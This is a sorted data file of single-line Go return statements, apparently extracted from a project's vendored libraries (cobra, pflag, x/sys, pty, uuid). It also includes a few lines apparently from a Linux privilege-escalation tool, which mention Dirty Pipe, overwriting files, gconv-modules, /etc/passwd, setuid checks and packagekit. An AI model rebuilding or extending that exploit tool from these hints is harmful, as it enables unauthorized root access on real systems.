"return ""signal "" "
"return ""string"""
"return ""stringArray"""
"return ""stringSlice"""
"return ""stringToInt"""
"return ""stringToInt64"""
"return ""stringToString"""
"return ""terminal: ErrPasteIndicator not correctly handled"""
"return ""uint"""
"return ""uint16"""
"return ""uint32"""
"return ""uint64"""
"return ""uint8"""
"return ""uintSlice"""
"return -1, """", ENOATTR"
"return -1, -1, -1, ENOSYS"
"return -1, -1, err"
"return -1, EAFNOSUPPORT"
"return -1, EINVAL"
"return -1, ENOSYS"
"return -1, err"
"return -1, syscall.ENOENT"
"return -2, fmt.Errorf(""index for right 0x%x out of range"", right)"
"return 0, 0, err"
"return 0, 0, fmt.Errorf(""terminal: GetSize not implemented on %s/%s"", runtime.GOOS, runtime.GOARCH)"
"return 0, EBADF"
"return 0, EINVAL"
"return 0, EIO"
"return 0, e"
"return 0, err"
"return 0, errno"
"return 0, errorspkg.New(""parameter must be a ResourceID or a string"")"
"return 0, false"
"return 0, fmt.Errorf(""len(s) (%d) is less than min events requested (%d)"", len(s), min)"
"return 0, fmt.Errorf(""need to request at least one event or use Pending() instead"")"
"return 0, nil"
"return 0, nil, ECONNABORTED"
"return 0, syscall.EPIPE"
"return 0, syscall.Errno(errno)"
"return ArbitraryArgs(c, args)"
"return BoolP(name, """", value, usage)"
"return ByteSliceToString(value[:]), err"
"return CommandLine.BoolSliceP(name, """", value, usage)"
"return CommandLine.BoolSliceP(name, shorthand, value, usage)"
"return CommandLine.BytesBase64P(name, """", value, usage)"
"return CommandLine.BytesBase64P(name, shorthand, value, usage)"
"return CommandLine.BytesHexP(name, """", value, usage)"
"return CommandLine.BytesHexP(name, shorthand, value, usage)"
"return CommandLine.CountP(name, """", usage)"
"return CommandLine.CountP(name, shorthand, usage)"
"return CommandLine.DurationP(name, """", value, usage)"
"return CommandLine.DurationP(name, shorthand, value, usage)"
"return CommandLine.DurationSliceP(name, """", value, usage)"
"return CommandLine.DurationSliceP(name, shorthand, value, usage)"
"return CommandLine.Float32P(name, """", value, usage)"
"return CommandLine.Float32P(name, shorthand, value, usage)"
"return CommandLine.Float32SliceP(name, """", value, usage)"
"return CommandLine.Float32SliceP(name, shorthand, value, usage)"
"return CommandLine.Float64P(name, """", value, usage)"
"return CommandLine.Float64P(name, shorthand, value, usage)"
"return CommandLine.Float64SliceP(name, """", value, usage)"
"return CommandLine.Float64SliceP(name, shorthand, value, usage)"
"return CommandLine.IPMaskP(name, """", value, usage)"
"return CommandLine.IPMaskP(name, shorthand, value, usage)"
"return CommandLine.IPNetP(name, """", value, usage)"
"return CommandLine.IPNetP(name, shorthand, value, usage)"
"return CommandLine.IPP(name, """", value, usage)"
"return CommandLine.IPP(name, shorthand, value, usage)"
"return CommandLine.IPSliceP(name, """", value, usage)"
"return CommandLine.IPSliceP(name, shorthand, value, usage)"
"return CommandLine.Int16P(name, """", value, usage)"
"return CommandLine.Int16P(name, shorthand, value, usage)"
"return CommandLine.Int32P(name, """", value, usage)"
"return CommandLine.Int32P(name, shorthand, value, usage)"
"return CommandLine.Int32SliceP(name, """", value, usage)"
"return CommandLine.Int32SliceP(name, shorthand, value, usage)"
"return CommandLine.Int64P(name, """", value, usage)"
"return CommandLine.Int64P(name, shorthand, value, usage)"
"return CommandLine.Int64SliceP(name, """", value, usage)"
"return CommandLine.Int64SliceP(name, shorthand, value, usage)"
"return CommandLine.Int8P(name, """", value, usage)"
"return CommandLine.Int8P(name, shorthand, value, usage)"
"return CommandLine.IntP(name, """", value, usage)"
"return CommandLine.IntP(name, shorthand, value, usage)"
"return CommandLine.IntSliceP(name, """", value, usage)"
"return CommandLine.IntSliceP(name, shorthand, value, usage)"
"return CommandLine.Set(name, value)"
"return CommandLine.StringArrayP(name, """", value, usage)"
"return CommandLine.StringArrayP(name, shorthand, value, usage)"
"return CommandLine.StringP(name, """", value, usage)"
"return CommandLine.StringP(name, shorthand, value, usage)"
"return CommandLine.StringSliceP(name, """", value, usage)"
"return CommandLine.StringSliceP(name, shorthand, value, usage)"
"return CommandLine.StringToInt64P(name, """", value, usage)"
"return CommandLine.StringToInt64P(name, shorthand, value, usage)"
"return CommandLine.StringToIntP(name, """", value, usage)"
"return CommandLine.StringToIntP(name, shorthand, value, usage)"
"return CommandLine.StringToStringP(name, """", value, usage)"
"return CommandLine.StringToStringP(name, shorthand, value, usage)"
"return CommandLine.Uint16P(name, """", value, usage)"
"return CommandLine.Uint16P(name, shorthand, value, usage)"
"return CommandLine.Uint32P(name, """", value, usage)"
"return CommandLine.Uint32P(name, shorthand, value, usage)"
"return CommandLine.Uint64P(name, """", value, usage)"
"return CommandLine.Uint64P(name, shorthand, value, usage)"
"return CommandLine.Uint8P(name, """", value, usage)"
"return CommandLine.Uint8P(name, shorthand, value, usage)"
"return CommandLine.UintP(name, """", value, usage)"
"return CommandLine.UintP(name, shorthand, value, usage)"
"return CommandLine.UintSliceP(name, """", value, usage)"
"return CommandLine.UintSliceP(name, shorthand, value, usage)"
"return Constraints(result), nil"
"return CreateDirectory(pathp, nil)"
"return CreateWellKnownDomainSid(sidType, nil)"
"return CurrentProcess(), nil"
"return CurrentThread(), nil"
"return Dup3(oldfd, newfd, 0)"
"return EXTATTR_NAMESPACE_SYSTEM, attr, nil"
"return EXTATTR_NAMESPACE_USER, attr, nil"
"return EqualSid(sid, sid2)"
"return ExtattrGetFd(fd, nsid, a, uintptr(d), destsize)"
"return ExtattrGetFile(file, nsid, a, uintptr(d), destsize)"
"return ExtattrGetLink(link, nsid, a, uintptr(d), destsize)"
"return Faccessat(AT_FDCWD, path, mode, 0)"
"return Fchmodat(AT_FDCWD, path, mode, 0)"
"return Fchownat(AT_FDCWD, path, uid, gid, 0)"
"return Fchownat(AT_FDCWD, path, uid, gid, AT_SYMLINK_NOFOLLOW)"
"return FileHandle{fh}, int(mid), nil"
"return Fprintf(os.Stdout, input, a...)"
"return Fstatat(AT_FDCWD, path, stat, 0)"
"return Fstatat(AT_FDCWD, path, stat, AT_SYMLINK_NOFOLLOW)"
"return Fstatat(fd, """", stat, AT_EMPTY_PATH)"
"return Fstatfs(fd, stat)"
"return Fstatvfs1(fd, buf, ST_WAIT)"
"return Getdents(fd, buf)"
"return Getdents(fd, buf, new(uintptr))"
"return Getdirentries(fd, buf, base)"
"return Getdirentries(fd, buf, nil)"
"return GetsockoptInt(fd, SOL_SOCKET, SO_PROTOCOL)"
"return InvalidHandle, ERROR_FILE_NOT_FOUND"
"return InvalidHandle, err"
"return InvalidHandle, syscall.EAFNOSUPPORT"
"return Itimerval{}, err"
"return KeyctlInt(KEYCTL_GET_KEYRING_ID, id, createInt, 0, 0)"
"return Linkat(AT_FDCWD, oldpath, AT_FDCWD, newpath, 0)"
"return MarkFlagCustom(c.Flags(), name, f)"
"return MarkFlagDirname(c.Flags(), name)"
"return MarkFlagDirname(c.PersistentFlags(), name)"
"return MarkFlagFilename(c.Flags(), name, extensions...)"
"return MarkFlagFilename(c.PersistentFlags(), name, extensions...)"
"return MarkFlagRequired(c.Flags(), name)"
"return MarkFlagRequired(c.PersistentFlags(), name)"
"return Mkdirat(AT_FDCWD, path, mode)"
"return Mkfifo(path, mode)"
"return Mknod(path, mode"
"return Mknodat(AT_FDCWD, path, mode, dev)"
"return Mknodat(dirfd, path, mode"
"return MoveFileEx(from, to, MOVEFILE_REPLACE_EXISTING)"
"return NewDCESecurity(Group, uint32(os.Getgid()))"
"return NewDCESecurity(Person, uint32(os.Getuid()))"
"return NewHash(md5.New(), space, data, 3)"
"return NewHash(sha1.New(), space, data, 5)"
"return Nil, err"
"return OnlyValidArgs(cmd, args)"
"return Open(path, O_CREAT"
"return Pipe2(p, 0)"
"return Ppoll(fds, ts, nil)"
"return Pread(fd, p, -1)"
"return Pselect(nfd, r, w, e, ts, nil)"
"return PtraceIO(PIOD_READ_D, pid, addr, out, SizeofLong)"
"return PtraceIO(PIOD_READ_I, pid, addr, out, SizeofLong)"
"return PtraceIO(PIOD_WRITE_D, pid, addr, data, SizeofLong)"
"return PtraceIO(PIOD_WRITE_I, pid, addr, data, SizeofLong)"
"return Pwrite(fd, p, -1)"
"return Readlinkat(AT_FDCWD, path, buf)"
"return Renameat(AT_FDCWD, oldpath, AT_FDCWD, newpath)"
"return Renameat2(olddirfd, oldpath, newdirfd, newpath, 0)"
"return SetFileAttributes(p, attrs)"
"return SetFileTime(h, nil, "
"return Setsockopt(fd, int32(level), int32(opt), ("
"return SetsockoptString(fd, SOL_SOCKET, SO_BINDTODEVICE, device)"
"return SetupDiBuildDriverInfoList(deviceInfoSet, deviceInfoData, driverType)"
"return SetupDiCallClassInstaller(installFunction, deviceInfoSet, deviceInfoData)"
"return SetupDiCreateDeviceInfo(deviceInfoSet, deviceName, classGUID, deviceDescription, hwndParent, creationFlags)"
"return SetupDiDestroyDriverInfoList(deviceInfoSet, deviceInfoData, driverType)"
"return SetupDiEnumDeviceInfo(deviceInfoSet, memberIndex)"
"return SetupDiEnumDriverInfo(deviceInfoSet, deviceInfoData, driverType, memberIndex)"
"return SetupDiGetClassInstallParams(deviceInfoSet, deviceInfoData, classInstallParams, classInstallParamsSize, requiredSize)"
"return SetupDiGetDeviceInstallParams(deviceInfoSet, deviceInfoData)"
"return SetupDiGetDeviceInstanceId(deviceInfoSet, deviceInfoData)"
"return SetupDiGetDeviceRegistryProperty(deviceInfoSet, deviceInfoData, property)"
"return SetupDiGetDriverInfoDetail(deviceInfoSet, deviceInfoData, driverInfoData)"
"return SetupDiGetSelectedDriver(deviceInfoSet, deviceInfoData)"
"return SetupDiOpenDevRegKey(deviceInfoSet, DeviceInfoData, Scope, HwProfile, KeyType, samDesired)"
"return SetupDiSetClassInstallParams(deviceInfoSet, deviceInfoData, classInstallParams, classInstallParamsSize)"
"return SetupDiSetDeviceInstallParams(deviceInfoSet, deviceInfoData, deviceInstallParams)"
"return SetupDiSetDeviceRegistryProperty(deviceInfoSet, deviceInfoData, property, propertyBuffers)"
"return SetupDiSetSelectedDevice(deviceInfoSet, deviceInfoData)"
"return SetupDiSetSelectedDriver(deviceInfoSet, deviceInfoData, driverInfoData)"
"return StartWithAttrs(cmd, ws, cmd.SysProcAttr)"
"return StartWithSize(cmd, nil)"
"return Statvfs1(path, buf, ST_WAIT)"
"return Symlinkat(oldpath, AT_FDCWD, newpath)"
"return Time(now), clockSeq, nil"
"return Time_t(tv.Sec), nil"
"return Timespec{Sec: int32(sec), Nsec: int32(nsec)}"
"return Timespec{Sec: sec, Nsec: int32(nsec)}"
"return Timespec{Sec: sec, Nsec: nsec}"
"return Timespec{}, ERANGE"
"return Timeval{Sec: int32(sec), Usec: int32(usec)}"
"return Timeval{Sec: int64(sec), Usec: int32(usec)}"
"return Timeval{Sec: sec, Usec: int32(usec)}"
"return Timeval{Sec: sec, Usec: usec}"
"return Token(0), err"
"return Token(0).KnownFolderPath(folderID, flags)"
"return UTF16PtrToString(p), nil"
"return UTF16ToString(b), UTF16ToString(db), accType, nil"
"return UTF16ToString(b), nil"
"return UTF16ToString(b[:l]), nil"
"return UTF16ToString(b[:n]), nil"
"return UTF16ToString(buf), nil"
"return UTF16ToString(buf[:n]), nil"
"return UTF16ToString(ret[:n]), nil"
"return Unlinkat(AT_FDCWD, path, 0)"
"return Unlinkat(AT_FDCWD, path, AT_REMOVEDIR)"
"return Utimes(""/proc/self/fd/"""
"return Utimes(path, tv)"
"return UtimesNanoAt(AT_FDCWD, path, nil, AT_SYMLINK_NOFOLLOW)"
"return UtimesNanoAt(AT_FDCWD, path, ts, 0)"
"return UtimesNanoAt(AT_FDCWD, path, ts, AT_SYMLINK_NOFOLLOW)"
"return WSASendTo(s, bufs, bufcnt, sent, flags, ("
"return []bool{}, err"
"return []bool{}, nil"
"return []byte(nil), nil"
"return []byte(v.String()), nil"
"return []byte{}, err"
"return []float32{}, err"
"return []float32{}, nil"
"return []float64{}, err"
"return []float64{}, nil"
"return []int32{}, err"
"return []int32{}, nil"
"return []int64{}, err"
"return []int64{}, nil"
"return []int{}, err"
"return []int{}, nil"
"return []net.IP{}, err"
"return []net.IP{}, nil"
"return []string{""harbor"
"return []string{""json"", ""table"", ""yaml""}, cobra.ShellCompDirectiveDefault"
"return []string{""themes""}, cobra.ShellCompDirectiveFilterDirs"
"return []string{""yaml"", ""json""}, ShellCompDirectiveFilterFileExt})"
"return []string{}, err"
"return []string{}, nil"
"return []time.Duration{}, err"
"return []time.Duration{}, nil"
"return []uint{}, err"
"return []uint{}, nil"
"return _DnsQuery(_p0, qtype, options, extra, qrs, pr)"
"return _FindFirstChangeNotification(_p0, watchSubtree, notifyFilter)"
"return _GetFileVersionInfo(_p0, handle, bufSize, buffer)"
"return _GetFileVersionInfoSize(_p0, zeroHandle)"
"return _GetProcAddress(module, _p0)"
"return _GetServByName(_p0, _p1)"
"return _IOC(_IOC_IN, group, ioctl_num, param_len)"
"return _IOC(_IOC_IN_OUT, group, ioctl_num, param_len)"
"return _IOC(_IOC_OUT, group, ioctl_num, param_len)"
"return _IOC(_IOC_VOID, group, ioctl_num, 0)"
"return _LoadLibraryEx(_p0, zero, flags)"
"return _SetNamedSecurityInfo(_p0, objectType, securityInformation, owner, group, dacl, sacl)"
"return _VerQueryValue(block, _p0, pointerToBufferPointer, bufSize)"
"return __makedev(NEWDEV, uint(major), uint(minor))"
"return _convertStringSecurityDescriptorToSecurityDescriptor(_p0, revision, sd, size)"
"return _getNamedSecurityInfo(_p0, objectType, securityInformation, owner, group, dacl, sacl, sd)"
"return a, ErrHelp"
"return a, nil"
"return al, err"
"return anyToSockaddr(0, "
"return anyToSockaddr(fd, "
"return anyToSockaddrGOOS(fd, rsa)"
"return append(compArray, fmt.Sprintf(""%s%s"", activeHelpMarker, activeHelpStr))"
"return args, nil"
"return armSyncFileRange(fd, flags, off, n)"
"return atoi(b[m : n-1]), nil"
"return b != 0, nil"
"return b, nil"
"return bin, nil"
"return binary.BigEndian.Uint32(buf), nil"
"return binary.LittleEndian.Uint32(buf), nil"
"return binary.LittleEndian.Uint64(buf), nil"
"return bind(fd, ptr, n)"
"return bind(name, old, flag)"
"return bit2idx[idx], nil"
"return buf, nil"
"return buf[0 : n/siz], nil"
"return buf[:n/SizeofKinfoProc], nil"
"return buf[:n], nil"
"return buf[:reqSize], nil"
"return c, []string{}, ShellCompDirectiveDefault, fmt.Errorf(""Unable to find a command for arguments: %v"", trimmedArgs)"
"return c, args, nil"
"return c, err"
"return c, innerArgs"
"return c.Args(c, args)"
"return c.FlagErrorFunc()(c, err)"
"return c.GenBashCompletionV2(outFile, includeDesc)"
"return c.GenFishCompletion(outFile, includeDesc)"
"return c.f(v, c.check)"
"return c.genBashCompletion(w, includeDesc)"
"return c.genPowerShellCompletion(outFile, includeDesc)"
"return c.genPowerShellCompletion(w, false)"
"return c.genPowerShellCompletion(w, true)"
"return c.genPowerShellCompletionFile(filename, false)"
"return c.genPowerShellCompletionFile(filename, true)"
"return c.genZshCompletion(outFile, includeDesc)"
"return c.genZshCompletion(w, false)"
"return c.genZshCompletion(w, true)"
"return c.genZshCompletionFile(filename, false)"
"return c.genZshCompletionFile(filename, true)"
"return candidate, nil"
"return capRightsLimit(int(fd), rights)"
"return choices, directive"
"return cm_MapCrToWin32Err(ret, defaultError)"
"return cmd, err"
"return cmd, nil"
"return cmd.Root().GenBashCompletionV2(out, !noDesc)"
"return cmd.Root().GenFishCompletion(out, !noDesc)"
"return cobra.AppendActiveHelp(nil, ""You must first specify the chart to install before the --version flag can be completed""), cobra.ShellCompDirectiveNoFileComp"
"return commandFound, a, legacyArgs(commandFound, stripFlags(a, commandFound))"
"return commandFound, a, nil"
"return compVersionFlag(args[1], toComplete)"
"return comparePrereleases(preSelf, preOther)"
"return completions, ShellCompDirectiveNoFileComp"
"return comps, cobra.ShellCompDirectiveNoFileComp"
"return connect(fd, ptr, n)"
"return connectEx(fd, ptr, n, sendBuf, sendDataLen, bytesSent, overlapped)"
"return create(path, mode, perm)"
"return cstring(buf[:]), nil"
"return d, nil"
"return data, nil"
"return data, setupDiCreateDeviceInfo(deviceInfoSet, deviceNameUTF16, classGUID, deviceDescriptionUTF16, hwndParent, creationFlags, data)"
"return data, setupDiEnumDeviceInfo(deviceInfoSet, uint32(memberIndex), data)"
"return data, setupDiEnumDriverInfo(deviceInfoSet, deviceInfoData, driverType, uint32(memberIndex), data)"
"return data, setupDiGetDeviceInfoListDetail(deviceInfoSet, data)"
"return data, setupDiGetSelectedDevice(deviceInfoSet, data)"
"return data, setupDiGetSelectedDriver(deviceInfoSet, deviceInfoData, data)"
"return dir, err"
"return e, nil"
"return entry, nil"
"return env, nil"
"return epfd, nil"
"return err == nil, err"
"return errors.New(""access denied"")"
"return errors.New(""bad right version"")"
"return errors.New(""bad rights size"")"
"return errors.New(""cannot write to an offset aligned with a page boundary"")"
"return errors.New(""index mismatch (after assign)"")"
"return errors.New(""index mismatch"")"
"return errors.New(""index overflow"")"
"return errorspkg.New(""failed to find ConnectEx: "" "
"return exec.Command(""apk"", ""-e"", ""info"", name).Run() == nil"
"return exec.Command(""cc"", ""-Wall"", ""-shared"", ""-fPIC"", ""-o"", path, srcPath).Run()"
"return exec.Command(""dpkg"", ""-s"", name).Run() == nil"
"return exec.Command(""pacman"", ""-Qi"", name).Run() == nil"
"return exec.Command(""rpm"", ""-q"", name).Run() == nil"
"return extpread(fd, p, 0, offset)"
"return extpwrite(fd, p, 0, offset)"
"return f.BoolP(name, """", value, usage)"
"return f.DefValue == """""
"return f.DefValue == ""0"" "
"return f.DefValue == ""0"""
"return f.DefValue == ""<nil>"""
"return f.DefValue == ""[]"""
"return f.DefValue == ""false"""
"return f.Set(flag.Name, value)"
"return faccessat(dirfd, path, mode)"
"return false, e"
"return false, err"
"return false, errors.New(""bad right version"")"
"return false, errors.New(""bad rights size"")"
"return false, errors.New(""index mismatch"")"
"return false, errors.New(""index overflow"")"
"return false, fmt.Errorf(""bad rights version %d"", capver(rights))"
"return false, nil"
"return fanotifyMark(fd, flags, mask, dirFd, nil)"
"return fanotifyMark(fd, flags, mask, dirFd, p)"
"return fchmodat(dirfd, path, mode)"
"return fcntl(int(fd), cmd, arg)"
"return fd, err"
"return fds, nil"
"return fgetxattr(fd, attr, xattrPointer(dest), len(dest), 0, 0)"
"return finalCmd, []string{}, ShellCompDirectiveDefault, flagErr"
"return finalCmd, []string{}, ShellCompDirectiveDefault, fmt.Errorf(""Error while parsing flags from args %v: %s"", finalArgs, err.Error())"
"return finalCmd, []string{}, ShellCompDirectiveFilterDirs, nil"
"return finalCmd, completions, directive, nil"
"return finalCmd, subDir, ShellCompDirectiveFilterDirs, nil"
"return finalCmd, validExts, ShellCompDirectiveFilterFileExt, nil"
"return flag, trimmedArgs, lastArg, nil"
"return flag.NoOptDefVal != """""
"return flags.SetAnnotation(name, BashCompCustom, []string{f})"
"return flags.SetAnnotation(name, BashCompFilenameExt, extensions)"
"return flags.SetAnnotation(name, BashCompOneRequiredFlag, []string{""true""})"
"return flags.SetAnnotation(name, BashCompSubdirsInDir, []string{})"
"return flistxattr(fd, xattrPointer(dest), len(dest), 0)"
"return float32(t64), nil"
"return float32(v), nil"
"return fmt.Errorf(""%s must be formatted as key=value"", pair)"
"return fmt.Errorf(""%s must be formatted as key=value"", val)"
"return fmt.Errorf(""%v is already associated with this Event Port"", fd)"
"return fmt.Errorf(""%v is already associated with this Event Port"", path)"
"return fmt.Errorf(""%v is not associated with this Event Port"", fd)"
"return fmt.Errorf(""%v is not associated with this Event Port"", path)"
"return fmt.Errorf(""Called Execute() on a nil Command"")"
"return fmt.Errorf(""RegisterFlagCompletionFunc: flag '%s' already registered"", flagName)"
"return fmt.Errorf(""RegisterFlagCompletionFunc: flag '%s' does not exist"", flagName)"
"return fmt.Errorf(""Scan: %v"", err)"
"return fmt.Errorf(""Scan: unable to scan type %T into UUID"", src)"
"return fmt.Errorf(""accepts %d arg(s), received %d"", n, len(args))"
"return fmt.Errorf(""accepts at most %d arg(s), received %d"", n, len(args))"
"return fmt.Errorf(""accepts between %d and %d arg(s), received %d"", min, max, len(args))"
"return fmt.Errorf(""bad rights version %d"", capver(rights))"
"return fmt.Errorf(""cannot use execpromises on OpenBSD %d.%d"", maj, min)"
"return fmt.Errorf(""cloud not create exploit dir: %s"", err)"
"return fmt.Errorf(""could not create temp dir: %s"", err)"
"return fmt.Errorf(""custom payloads are not supported for this exploit"")"
"return fmt.Errorf(""delete failed, status: %d"", resp.StatusCode)"
"return fmt.Errorf(""deprecated message for flag %q must be set"", name)"
"return fmt.Errorf(""docker api error - unexpected status code: %d"", resp.StatusCode)"
"return fmt.Errorf(""docker api error - unexpected status code: %d"", respStart.StatusCode)"
"return fmt.Errorf(""docker api error - unexpected status code: %d"", waitResp.StatusCode)"
"return fmt.Errorf(""failed to create dirty pipe: %w"", err)"
"return fmt.Errorf(""failed to create fake executable: %s"", err)"
"return fmt.Errorf(""failed to create user"")"
"return fmt.Errorf(""failed to force install of '%s' via packagekit"", name)"
"return fmt.Errorf(""failed to overwrite target file: %w"", err)"
"return fmt.Errorf(""failed to parse IP mask: %q"", s)"
"return fmt.Errorf(""failed to parse IP: %q"", s)"
"return fmt.Errorf(""failed to read target file: %w"", err)"
"return fmt.Errorf(""failed to start container: %s"", string(data))"
"return fmt.Errorf(""failed to write gconv-modules: %s"", err)"
"return fmt.Errorf(""flag %q does not exist"", name)"
"return fmt.Errorf(""if any flags in the group [%v] are set none of the others can be"
"return fmt.Errorf(""if any flags in the group [%v] are set they must all be set"
"return fmt.Errorf(""invalid UUID (got %d bytes)"", len(data))"
"return fmt.Errorf(""invalid argument %q for %q flag: %v"", value, flagName, err)"
"return fmt.Errorf(""invalid argument %q for %q%s"", v, cmd.CommandPath(), cmd.findSuggestions(args[0]))"
"return fmt.Errorf(""invalid password"")"
"return fmt.Errorf(""invalid string being converted to IP address: %s"", ipStr)"
"return fmt.Errorf(""name cannot be more than %d characters"", len(l.Name)-1)"
"return fmt.Errorf(""no image available"")"
"return fmt.Errorf(""no such flag -%v"", name)"
"return fmt.Errorf(""pledge syscall is not available on OpenBSD %d.%d"", maj, min)"
"return fmt.Errorf(""required packages are not available"")"
"return fmt.Errorf(""requires at least %d arg(s), only received %d"", n, len(args))"
"return fmt.Errorf(""setuid is not set: %o"", info.Mode())"
"return fmt.Errorf(""splice error: %w"", err)"
"return fmt.Errorf(""splice failed (%d)"", spliced)"
"return fmt.Errorf(""terminal: Restore not implemented on %s/%s"", runtime.GOOS, runtime.GOARCH)"
"return fmt.Errorf(""timed out"")"
"return fmt.Errorf(""unexpected data in /etc/passwd"")"
"return fmt.Errorf(""unknown command %q for %q"", args[0], cmd.CommandPath())"
"return fmt.Errorf(""unknown command %q for %q%s"", args[0], cmd.CommandPath(), cmd.findSuggestions(args[0]))"
"return fmt.Errorf(""write failed: %w"", err)"
"return fmt.Errorf(""write partially failed - %d bytes written"", n)"
"return fmt.Sprintf(""%X"", []byte(bytesHex))"
"return fmt.Sprintf(""%d"", val)"
"return fmt.Sprintf(""%f"", val)"
"return fmt.Sprintf(""%s (CfgMgr error: 0x%08x)"", win32Error.Error(), uint32(ret))"
"return fmt.Sprintf(""%s"", val)"
"return fmt.Sprintf(""BAD_VERSION_%d"", v)"
"return fmt.Sprintf(""BadVariant%d"", int(v))"
"return fmt.Sprintf(""CfgMgr error: 0x%08x"", uint32(ret))"
"return fmt.Sprintf(""Domain%d"", int(d))"
"return fmt.Sprintf(""ERROR: unexpected ShellCompDirective value: %d"", d)"
"return fmt.Sprintf(""NTSTATUS 0x%08x"", uint32(s))"
"return fmt.Sprintf(""VERSION_%d"", v)"
"return fmt.Sprintf(""invalid UUID length: %d"", err.len)"
"return fmt.Sprintf(format, a...)"
"return fmt.Sprintf(template, s)"
"return fn, nil"
"return fobj, nil"
"return fremovexattr(fd, attr, 0)"
"return fsetxattr(fd, attr, xattrPointer(data), len(data), 0, 0)"
"return fstat(fd, stat)"
"return fstat_freebsd12(fd, st)"
"return fstatat(dirfd, path, stat, flags)"
"return fstatat_freebsd12(AT_FDCWD, path, st, 0)"
"return fstatat_freebsd12(AT_FDCWD, path, st, AT_SYMLINK_NOFOLLOW)"
"return fstatat_freebsd12(fd, path, st, flags)"
"return fstatfs_freebsd12(fd, st)"
"return fsyncRange(fd, O_SYNC, 0, 0)"
"return futimes(fd, ("
"return futimes(fd, nil)"
"return futimesat(dirfd, path, ("
"return futimesat(dirfd, path, nil)"
"return futimesat(dirfd, pathp, ("
"return futimesat(dirfd, pathp, nil)"
"return futimesat(fd, nil, ("
"return futimesat(fd, nil, nil)"
"return getRegistryValue(buf[:reqSize], dataType)"
"return getReleasesFromCluster(toComplete), cobra.ShellCompDirectiveNoFileComp"
"return getUILanguages(flags, getProcessPreferredUILanguages)"
"return getUILanguages(flags, getSystemPreferredUILanguages)"
"return getUILanguages(flags, getThreadPreferredUILanguages)"
"return getUILanguages(flags, getUserPreferredUILanguages)"
"return getdirent(fd, buf)"
"return getdirentries_freebsd12(fd, buf, ("
"return getfsstat(_p0, bufsize, flags)"
"return getrlimit(resource, rlim)"
"return getxattr(link, attr, xattrPointer(dest), len(dest), 0, XATTR_NOFOLLOW)"
"return getxattr(path, attr, xattrPointer(dest), len(dest), 0, 0)"
"return guid, err"
"return guid, nil"
"return h, b[cmsgAlignOf(SizeofCmsghdr):h.Len], nil"
"return h, e"
"return i, nil"
"return ifs.Name, ifs.HardwareAddr"
"return imageList, nil"
"return impl.epollctl(epfd, op, fd, event)"
"return impl.epollwait(epfd, events, msec)"
"return innerfind(cmd, argsMinusFirstX(innerArgs, nextSubCmd))"
"return int(done), nil"
"return int(fd), err"
"return int(fd), nil"
"return int(got), err"
"return int(ioDesc.Len), err"
"return int(n), err"
"return int(n), nil"
"return int(ret), nil"
"return int(v), err"
"return int(valptr), err"
"return int(ws.Col), int(ws.Row), nil"
"return int(ws.Rows), int(ws.Cols), nil"
"return int16(v), nil"
"return int32(t64), nil"
"return int32(v), nil"
"return int64(ts.Sec), int64(ts.Nsec)"
"return int64(tv.Sec), int64(tv.Usec) "
"return int8(v), nil"
"return interfaces, nil"
"return ioctl(destFd, FICLONE, uintptr(srcFd))"
"return ioctl(f.Fd(), I_PUSH, uintptr(unsafe.Pointer("
"return ioctl(f.Fd(), I_STR, uintptr(unsafe.Pointer("
"return ioctl(f.Fd(), syscall.TIOCPTYGRANT, 0)"
"return ioctl(f.Fd(), syscall.TIOCPTYUNLK, 0)"
"return ioctl(f.Fd(), syscall.TIOCSPTLCK, uintptr(unsafe.Pointer("
"return ioctl(f.Fd(), uintptr(ioctl_TIOCGRANTPT), 0)"
"return ioctl(fd, WDIOC_KEEPALIVE, 0)"
"return ioctl(fd, req, uintptr(unsafe.Pointer("
"return ioctl(fd, req, uintptr(unsafe.Pointer(l)))"
"return ioctl(fd, req, uintptr(value))"
"return ioctl(t.Fd(), syscall.TIOCSWINSZ, uintptr(unsafe.Pointer(ws)))"
"return ioctlPtr(destFd, FICLONERANGE, unsafe.Pointer(value))"
"return ioctlPtr(fd, HIDIOCGRDESC, unsafe.Pointer(value))"
"return ioctlPtr(fd, RTC_SET_TIME, unsafe.Pointer(value))"
"return ioctlPtr(fd, RTC_WKALM_SET, unsafe.Pointer(value))"
"return ioctlPtr(fd, SIOCKCMATTACH, unsafe.Pointer("
"return ioctlPtr(fd, SIOCKCMUNATTACH, unsafe.Pointer("
"return ioctlPtr(fd, req, unsafe.Pointer("
"return ioctlPtr(fd, req, unsafe.Pointer(value))"
"return ioctlRet(fd, req, uintptr(arg))"
"return ioctlRet(fd, req, uintptr(unsafe.Pointer(s)))"
"return ioutil.WriteFile(path, so, 0755)"
"return ip, nil"
"return isWellKnownSid(sid, sidType)"
"return it, nil"
"return js[:], nil"
"return jsonNull, nil"
"return kevent(kq, change, len(changes), event, len(events), timeout)"
"return kexecFileLoad(kernelFd, initrdFd, cmdlineLen, cmdline, flags)"
"return keyAltLeft, b[6:]"
"return keyAltRight, b[6:]"
"return keyBackspace, b[1:]"
"return keyClearScreen, b[1:]"
"return keyDeleteLine, b[1:]"
"return keyDeleteWord, b[1:]"
"return keyDown, b[1:]"
"return keyDown, b[3:]"
"return keyEnd, b[1:]"
"return keyEnd, b[3:]"
"return keyHome, b[1:]"
"return keyHome, b[3:]"
"return keyLeft, b[1:]"
"return keyLeft, b[3:]"
"return keyPasteEnd, b[6:]"
"return keyPasteStart, b[6:]"
"return keyRight, b[1:]"
"return keyRight, b[3:]"
"return keyUnknown, b[i"
"return keyUp, b[1:]"
"return keyUp, b[3:]"
"return keyctlDH(KEYCTL_DH_COMPUTE, params, buffer)"
"return keyctlIOV(KEYCTL_INSTANTIATE_IOV, id, payload, ringid)"
"return keyctlJoin(KEYCTL_JOIN_SESSION_KEYRING, name)"
"return keyctlRestrictKeyring(KEYCTL_RESTRICT_KEYRING, ringid)"
"return keyctlRestrictKeyringByType(KEYCTL_RESTRICT_KEYRING, ringid, keyType, restriction)"
"return keyctlSearch(KEYCTL_SEARCH, ringid, keyType, description, destRingid)"
"return languages, nil"
"return linkedToken, nil"
"return listen(s, int32(n))"
"return listxattr(link, xattrPointer(dest), len(dest), XATTR_NOFOLLOW)"
"return listxattr(path, xattrPointer(dest), len(dest), 0)"
"return lstat(path, stat)"
"return make([]int, 0), nil"
"return map[string]int64{}, err"
"return map[string]int64{}, nil"
"return map[string]int{}, err"
"return map[string]int{}, nil"
"return map[string]string{}, err"
"return map[string]string{}, nil"
"return mapper.Mmap(fd, offset, length, prot, flags)"
"return mask, nil"
"return mib, nil"
"return mknod(path, mode, oldDev)"
"return mknodat(fd, path, mode, oldDev)"
"return mknodat_freebsd12(AT_FDCWD, path, mode, dev)"
"return mknodat_freebsd12(fd, path, mode, dev)"
